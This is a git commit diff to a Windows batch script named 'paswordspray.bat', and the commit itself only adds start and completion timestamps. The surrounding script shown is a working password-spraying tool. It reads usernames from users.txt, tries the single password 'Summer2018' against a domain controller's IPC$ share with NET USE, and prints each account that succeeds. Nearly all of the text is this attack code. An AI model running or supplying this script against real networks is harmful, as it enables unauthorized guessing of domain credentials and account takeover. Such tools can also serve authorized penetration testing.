547767b02c1f0b1b96b6141d805860bdba14cb40
Mark Eldridge <8285554+meldridge@users.noreply.github.com>
2018-06-08 14:06:48 +0200

    Added timestamps

--- paswordspray.bat
+++ paswordspray.bat
@@ -4,7 +4,8 @@ REM Note: if usernames are in UPN format, use /USER:%%U without the DOMAIN\ pref
 SET "DC=DC.DOMAIN.COM"
 SET "PASS=Summer2018"
 
+echo Started: %date% %time%
 FOR /F %%U IN (users.txt) DO (
   NET USE \\%DC%\IPC$ /USER:DOMAIN\%%U "%PASS%" 1>NUL 2>&1 && echo [*] %%U:"%PASS%" success && @NET USE /DELETE \\%DC%\IPC$ >NUL
 )
-
+echo Completed: %date% %time%
